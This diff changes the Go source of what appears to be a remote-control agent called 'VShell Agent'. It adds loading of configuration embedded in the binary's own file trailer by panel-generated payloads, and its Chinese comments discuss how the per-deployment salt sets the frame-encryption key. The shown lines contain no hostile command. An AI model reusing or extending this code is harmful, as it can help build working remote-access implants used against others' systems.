@@ -2965,6 +2965,18 @@ func main() {
 	log.Printf("VShell Agent v%s starting (%s/%s)", agentVersion, runtime.GOOS, runtime.GOARCH)
 	log.Printf("Host: %s, User: %s, PID: %d", hostname, username, pid)
 
+	// 优先从**自身文件尾部**读取配置块（面板生成的载荷带这个块），
+	// 没有块时才回落到 ldflags 注入值。顺序很重要：必须在解析 ServerAddr
+	// 之前完成，否则 mode/addr 会按占位符解析。
+	if cfg, err := loadEmbeddedConfig(); err == nil {
+		applyEmbeddedConfig(cfg)
+		log.Printf("config: loaded from file trailer (mode=%q server=%q)", cfg["mode"], cfg["server"])
+	} else if err == errNoEmbeddedConfig {
+		log.Printf("config: no trailer, using build-time values")
+	} else {
+		log.Printf("config: trailer present but unreadable: %v", err)
+	}
+
 	// 消息帧密钥 = md5(本次部署的盐)。默认常量只是"被恢复的那次部署"的取值，
 	// 实际部署必须用 ldflags 注入的 EncryptSalt 覆盖，否则服务端（按监听器
 	// EncryptSalt 派生）与 agent 的帧密钥不同，帧解不开 —— 见 docs/PROTOCOL.md。
